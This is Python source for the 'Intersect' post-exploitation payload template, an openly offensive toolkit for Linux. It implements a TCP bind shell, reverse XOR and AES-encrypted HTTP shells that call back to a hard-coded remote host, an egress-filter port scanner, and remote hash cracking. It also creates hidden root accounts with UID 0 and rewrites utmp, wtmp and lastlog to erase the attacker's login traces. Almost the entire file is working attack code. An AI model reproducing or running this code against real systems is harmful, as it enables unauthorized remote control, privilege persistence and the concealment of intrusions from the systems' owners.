#!/usr/bin/python
# intersect 2.0 | created by ohdae
# copyright 2012
# payload_template to be used with Create.py

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import platform
import shutil
import getopt
import tarfile
import socket
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import thread
import base64
import operator
import SocketServer, SimpleHTTPServer

cut = lambda s: str(s).split("\0",1)[0]
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    try:
        from scapy import *
    except ImportError:
        print("Scapy is not installed. It can be downloaded here => https://www.secdev.org/projects/scapy/\n")

def environment():
    global Home_Dir
    global Temp_Dir
    global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
    global distro
    global distro2

    ## Global variables for remote shells are defined during the creation process
    ## Variables for Scrub module. Do not change unless you know what you're doing. 
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
    UTMP_FILEPATH       = "/var/run/utmp"
    WTMP_FILEPATH       = "/var/log/wtmp"
    LASTLOG_FILEPATH    = "/var/log/lastlog"

    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
 
    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
    Config_Dir = Temp_Dir+"/configs/"

    if os.geteuid() != 0:
        print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
        print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
        option = raw_input("=> " )
        if option == '1':
            privesc()
            sys.exit()
        else:
            sys.exit()
    else:
        pass

    signal.signal(signal.SIGINT, signalHandler)

    os.system("clear")
    print("[+] Creating temporary working environment....")

    os.chdir(Home_Dir)

    if os.path.exists(Temp_Dir) is True:
        os.system("rm -rf "+Temp_Dir)

    if os.path.exists(Temp_Dir) is False:
        os.mkdir(Temp_Dir)

    print "[!] Reports will be saved in: %s" % Temp_Dir


def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, shutting down now");
    Shutdown()

  
def Shutdown():
    if not os.listdir(Temp_Dir):
        os.rmdir(Temp_Dir)
    sys.exit()

def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
        if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def copy2temp(filename, subdir=""):
    if os.path.exists(filename) is True: 
        pass
        if subdir == "" is True:
            shutil.copy2(filename, Temp_Dir)
        else:
            if os.path.exists(Temp_Dir+"/"+subdir) is True:
                subdir = (Temp_Dir+"/"+subdir)
                shutil.copy2(filename, subdir)
            elif os.path.exists(subdir) is True:
                shutil.copy2(filename, subdir)
            else:
                subdir = (Temp_Dir+"/"+subdir)
                os.mkdir(subdir)
                shutil.copy2(filename, subdir)
    else:
        pass

def write2file(filename, text):
    if os.path.exists(filename) is True:
        target = open(filename, "a")
        target.write(text)
        target.close()
    else:
        pass

def writenew(filename, content):
    new = open(filename, "a")
    new.write(content)
    new.close()

def file2file(readfile, writefile):
    if os.path.exists(readfile) is True:
        readfile = open(readfile)
        if os.path.exists(writefile) is True:
            writefile = open(writefile, "a")
            for lines in readfile.readlines():
                writefile.write(lines)
            writefile.close()
            readfile.close()
        else:
            readfile.close()
    else:
        pass
			
def maketemp(subdir):
    moddir = (Temp_Dir+"/"+subdir)
    if os.path.exists(moddir) is False:
        os.mkdir(moddir)
    else:
        pass

def users():
    global userlist
    userlist = []
    passwd = open('/etc/passwd')
    for line in passwd:
        fields = line.split(':')
        uid = int(fields[2])
        if uid > 500 and uid < 32328:
            userlist.append(fields[0])

def combinefiles(newfile, filelist):
    content = ''
    for f in filelist:
        if os.path.exists(f) is True:
            content = content + '\n' + open(f).read()
            open(newfile,'wb').write(content)
        else:
            pass

def tardir(name, directory):
    tar = tarfile.open("%s.tar.gz", "w:gz" % name)
    if os.path.exists(directory) is True:
        tar.add("%s/" % directory)
        print("[+] %s added to %s.tar.gz" % (name, directory))
        tar.close()
    else:
        print("[!] Could not find directory %s " % directory)
        tar.close()

def tarlist(name, filelist):
    tar = tarfile.open("%s.tar.gz" % name, "w:gz")
    for files in filelist:
        if os.path.exists(files) is True:
            tar.add(files)
        else:
            print("[!] %s not found. Skipping.." % files)
    tar.close()

    print("[+] %s.tar.gz file created!" % name)




def globalvars():
    global PORT
    global RHOST
    global RPORT
    global PPORT
    global PKEY
    global modList

    modList = ['bshell', 'xmlcrack', 'egressbuster', 'aeshttp', 'reversexor', 'xorshell', 'scrub']
    PORT = 4444
    RHOST = '192.168.1.4'
    RPORT = 6666
    PPORT = 8888
    PKEY = 'JFDSISXX'


def bshell():
    '''
    @description: Starts a TCP bind shell on the target system. Interactive shell with download/upload, cd and ability to execute other modules remotely."
    @author: ohdae [bindshell@live.com]
    @short: TCP bindshell
    '''
    HOST = ''
    socksize = 4096
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    try:
        server.bind((HOST, PORT))
        server.listen(10)
        conn, addr = server.accept()
        conn.send("\nIntersect "+str(os.getcwd())+" => ")
    except:
        print "[!] Connection closed."
        sys.exit(2)
    
    while True:
        cmd = conn.recv(socksize)
        proc = Popen(cmd,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()

        if cmd.startswith('cd'):
            destination = cmd[3:].replace('\n','')
            if os.path.isdir(destination):
                os.chdir(destination)
                conn.send("\nIntersect "+str(os.getcwd())+" => ")
            else:
                conn.send("[!] Directory does not exist") 
                conn.send("\nIntersect "+str(os.getcwd())+" => ")

        elif cmd.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send("[+] Root account " + acct + " has been created.") 

        elif cmd.startswith('upload'):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = conn.recv(socksize)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send("[+] File upload complete!")
            if not os.path.isfile(filename):
                conn.send("[!] File upload failed! Please try again")

        elif cmd.startswith('download'):
            getname = cmd.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                conn.sendall(filedata)
            else:
                conn.send("[+] File not found!")

        elif cmd.startswith("rebootsys"):
            conn.send("[!] Server system is going down for a reboot!")
            os.system("shutdown -h now")

        elif cmd == ("extask"):
            conn.send(str(modList))
            conn.send("\nIntersect "+str(os.getcwd())+" => ")

        elif cmd.startswith("extask"):
            getname = cmd.split(" ")
            modname = getname[1]
            if modname in modList is False:
                conn.send("[!] Module not loaded!")
            else:
                conn.send("[+] Executing %s " % modname)
                execmod = modname+"()"
                execmod

        elif cmd == ('killme'):
            conn.send("[!] Shutting down shell!\n")
            conn.close()
            sys.exit(0)

        elif proc:
            conn.sendall( stdout )
            conn.send("\nIntersect "+str(os.getcwd())+" => ")


def xmlcrack():
    '''
    @description: Sends hash list to remote XMLRPC server for cracking. Crackserver.py must be running on the remote host.
    @author: original code by Stephen Haywood aka averagesecurityguy
    @short: xmlrpc crack client (-x filename hashtype)
    '''
    if len(sys.argv) <=3:
        print("[!] Must specify a filename and hashtype!")
        sys.exit()

    import time
    try:
        import xmlrpclib
    except ImportError:
        print("[!] Python library XMLRPC is not installed!")
        sys.exit(0)    

    data = []
    filename = sys.argv[2]
    hashtype = sys.argv[3]

    try:
    #Open the hash file and convert it to an array before sending it in the
    #XMLRPC request.
        file = open(filename, 'rb')
        for line in file:
            data.append(line.rstrip('\r\n'))
        file.close()
    except Exception, err:
        print "Error opening file " + filename + ": " + str(err)

    # Open connection to xmlrpc server
    server = ("http://"+RHOST+":"+str(RPORT))
    try:
        s = xmlrpclib.ServerProxy(server)
    except:
        print "Error opening connection to server " + server + ": " + str(err)

    # Send request to server and receive ID
    id, msg = s.crack(data, hashtype)

    if id == 0:
        print msg
    else:
        # Poll server for completion status and results using ID.
        complete = False
        wait = 10
        while True:
            time.sleep(wait)
            complete, results = s.results(id)
            if results != []:
                for r in results:
                    print r.rstrip('\r\n')
            if complete: break    

def egressbuster():
    '''
    @description: Checks a range of ports to find available outbound ports. used to break egress filters.
    @author: original code by David Kennedy aka ReL1K
    @short: finds open outbound ports
    '''
    if len(sys.argv) <=2:
        print("[!] Must specify a port-range!")
        sys.exit()

    portrange = sys.argv[2]
    portrange = portrange.split("-")
    lowport = int(portrange[0])
    highport = int(portrange[1])        
    base_port = int(lowport)-1
    end_port = int(highport)

    print "Sending packets to egress listener..."

    while 1:
        base_port = base_port + 1
        thread.start_new_thread(start_socket, (RHOST,base_port))

        time.sleep(0.02)
        
        if base_port == end_port:
                break

    print "All packets have been sent"


def start_socket(RHOST,base_port):
    try:  
        sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockobj.connect((RHOST, base_port))
        sockobj.send(str(base_port))
        sockobj.close()
    except Exception, e:
        print e
        # pass through, ports closed
        pass



def aeshttp():
    '''
    @description: Starts a reverse HTTP shell with AES encryption that will connect back to a remote host.
    @short: reverse AES HTTP shell
    @author: original code by David Kennedy aka ReL1k
    '''
    import httplib
    import urllib
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("[!] Python Crypto library is not installed. This module will not work without this!")
        sys.exit(2) 

    BLOCK_SIZE = 32
    PADDING = '{'
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

    secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"

    cipher = AES.new(secret)

    while 1:

        req = urllib2.Request('http://%s:%s' % (RHOST,RPORT))
        message = urllib2.urlopen(req)
        message = base64.b64decode(message.read())
        message = DecodeAES(cipher, message)

        if message == "killme":
            sys.exit()

        if message.startswith("cd"):
            destination = message[3:].replace('\n','')
            if os.path.isdir(destination):
                os.chdir(destination)
            else:
                pass


        proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        data = proc.stdout.read() + proc.stderr.read()
        data = EncodeAES(cipher, data)
        data = base64.b64encode(data)
        data = urllib.urlencode({'cmd': '%s'}) % (data)
        h = httplib.HTTPConnection('%s:%s' % (RHOST,RPORT))
        headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
        h.request('POST', '/index.aspx', data, headers)



def xor(string, key):
    '''
    @description: Opens a reverse XOR ciphered TCP shell to a remote host. Interactive shell with download/upload and remote Intersect module execution.
    @author: ohdae [bindshell@live.com]
    @short: reverse XOR TCP shell
    '''
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data
  

def reversexor():
    socksize = 4096
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        conn.connect((RHOST, RPORT))
        conn.send(xor("[+] New connection established!", PKEY))
        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
    except:
        print("[!] Connection error!")
        sys.exit(2)

    while True:
        cmd = conn.recv(socksize)
        cmd2 = xor(cmd, PKEY)
        proc = Popen(cmd2,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()

        if cmd2.startswith('cd'):
            destination = cmd2[3:].replace('\n','')
            if os.path.isdir(destination):
                os.chdir(destination)
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
            elif os.path.isdir(os.getcwd()+destination):
                os.chdir(os.getcwd()+destination)
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
            else:
                conn.send(xor("[!] Directory does not exist", PKEY)) 
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))

        elif cmd2.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send(xor("[+] Root account " + acct + " has been created.", PKEY))

        elif cmd2.startswith('upload'):
            getname = cmd2.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            data = conn.recv(socksize)
            filedata = xor(data, PKEY)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send(xor("[+] File upload complete!", PKEY))
            if not os.path.isfile(filename):
                conn.send(xor("[!] File upload failed! Please try again", PKEY))

        elif cmd2.startswith('download'):
            getname = cmd2.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                senddata = xor(filedata, PKEY)
                conn.sendall(senddata)
            else:
                conn.send(xor("[+] File not found!", PKEY))

        elif cmd2.startswith("rebootsys"):
            conn.send(xor("[!] Server system is going down for a reboot!", PKEY))
            os.system("shutdown -h now")
 
        elif cmd2 == ("extask"):
            conn.send(xor(str(modList), PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))

        elif cmd2.startswith("extask"):
            getname = cmd.split(" ")
            modname = getname[1]
            if modname in modList is False:
                conn.send(xor("[!] Module not loaded!", PKEY))
            else:
                conn.send(xor("[+] Executing %s " % modname, PKEY))
                execmod = modname+"()"
                execmod

        elif cmd2 == ('killme'):
            conn.send(xor("[!] Shutting down shell!\n", PKEY))
            conn.close()
            sys.exit(0)

        elif proc:
            conn.send(xor( stdout , PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))



def xor(string, key):
    '''
    @description: Starts a XOR ciphered TCP bindshell on the target. Interactive shell with download/upload and remote Intersect module execution.
    @author: ohdae [bindshell@live.com]
    @short: XOR TCP bindshell
    '''
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data


def xorshell():
    HOST = ''
    socksize = 4096
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    try:
        server.bind((HOST, PORT))
        server.listen(10)
        print("[+] Shell bound on port %s" % PORT)
        conn, addr = server.accept()
        print "[+] New Connection: %s" % addr[0]
        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
    except:
        print "[!] Connection closed."
    	sys.exit(2)
    
    while True:
        cmd = conn.recv(socksize)
        cmd2 = xor(cmd, PKEY)
        proc = Popen(cmd2,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()

        if cmd2.startswith('cd'):
            destination = cmd2[3:].replace('\n','')
            if os.path.isdir(destination):
                os.chdir(destination)
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
            elif os.path.isdir(os.getcwd()+destination):
                os.chdir(os.getcwd()+destination)
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
            else:
                conn.send(xor("[!] Directory does not exist", PKEY)) 
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))

        elif cmd2.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send(xor("[+] Root account " + acct + " has been created.\n", PKEY)) 

        elif cmd2.startswith('upload'):
            getname = cmd2.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            data = conn.recv(socksize)
            filedata = xor(data, PKEY)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send(xor("[+] File upload complete!", PKEY))
            if not os.path.isfile(filename):
                conn.send(xor("[!] File upload failed! Please try again", PKEY))

        elif cmd2.startswith('download'):
            getname = cmd2.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                senddata = xor(filedata, PKEY)
                conn.sendall(senddata)
            else:
                conn.send(xor("[+] File not found!", PKEY))

        elif cmd2.startswith("rebootsys"):
            conn.send(xor("[!] Server system is going down for a reboot!", PKEY))
            os.system("shutdown -h now")

        elif cmd2 == ("extask"):
            conn.send(xor(str(modList), PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))

        elif cmd2.startswith("extask"):
            getname = cmd.split(" ")
            modname = getname[1]
            if modname in modList is False:
                conn.send(xor("[!] Module not loaded!", PKEY))
            else:
                conn.send(xor("[+] Executing %s " % modname, PKEY))
                execmod = modname+"()"
                execmod

        elif cmd2 == ('killme'):
            conn.send(xor("[!] Shutting down shell!\n", PKEY))
            conn.close()
            sys.exit(0)

        elif proc:
            conn.send(xor( stdout , PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))




def scrub():
  '''
  @description: Attempts to remove the currently logged in username and IP address from utmp, wtmp and lastlog. Intrusive method.
  @author: ohdae [bindshell@live.com]
  @short: cleans utmp, wtmp and lastlog
  '''
  try:
    Current_User = os.getlogin()
  except OSError:
    print "[!] Cannot find user in logs. Did you all ready run --scrub ?"
    return
    
  newUtmp = scrubFile(UTMP_FILEPATH, Current_User)
  writeNewFile(UTMP_FILEPATH, newUtmp)
  print "[+] %s cleaned" % UTMP_FILEPATH
  
  newWtmp = scrubFile(WTMP_FILEPATH, Current_User)
  writeNewFile(WTMP_FILEPATH, newWtmp)
  print "[+] %s cleaned" % WTMP_FILEPATH

  newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, Current_User)
  writeNewFile(LASTLOG_FILEPATH, newLastlog)
  print "[+] %s cleaned" % LASTLOG_FILEPATH


def scrubFile(filePath, Current_User):
  newUtmp = ""
  with open(filePath, "rb") as f:
    bytes = f.read(UTMP_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
      if cut(data[4]) != Current_User and cut(data[5]) != User_Ip_Address:
	newUtmp += bytes
      bytes = f.read(UTMP_STRUCT_SIZE)
  f.close()
  return newUtmp


def scrubLastlogFile(filePath, Current_User):
  pw  	     = pwd.getpwnam(Current_User)
  uid	     = pw.pw_uid
  idCount    = 0
  newLastlog = ''
  
  with open(filePath, "rb") as f:
    bytes = f.read(LASTLOG_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hh32s256s", bytes)
      if (idCount != uid):
	newLastlog += bytes
      idCount += 1
      bytes = f.read(LASTLOG_STRUCT_SIZE)
  return newLastlog


def writeNewFile(filePath, fileContents):
  f = open(filePath, "w+b")
  f.write(fileContents)
  f.close()




def usage():
    print('============================================')
    print('   intersect 2.5 | custom version     ')
    print('      http://bindshell.it.cx | ohdae')
    print(' Modules:')
    print('    -b    --bshell        TCP bindshell')
    print('    -x    --xmlcrack        xmlrpc crack client (-x filename hashtype)')
    print('    -e    --egressbuster        finds open outbound ports')
    print('    -a    --aeshttp        reverse AES HTTP shell')
    print('    -r    --reversexor        reverse XOR TCP shell')
    print('    -x    --xorshell        XOR TCP bindshell')
    print('    -s    --scrub        cleans utmp, wtmp and lastlog')

def main(argv):
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'bxearxs', ['bshell', 'xmlcrack', 'egressbuster', 'aeshttp', 'reversexor', 'xorshell', 'scrub', 'help'])
    except getopt.GetoptError, err:
        print str(err)
        Shutdown()
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            Shutdown()
            sys.exit(2)
        elif o in ('-b', '--bshell'):
            bshell()
        elif o in ('-x', '--xmlcrack'):
            xmlcrack()
        elif o in ('-e', '--egressbuster'):
            egressbuster()
        elif o in ('-a', '--aeshttp'):
            aeshttp()
        elif o in ('-r', '--reversexor'):
            reversexor()
        elif o in ('-x', '--xorshell'):
            xorshell()
        elif o in ('-s', '--scrub'):
            scrub()
        else:
            assert False, 'unhandled option'
    Shutdown()


globalvars()
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])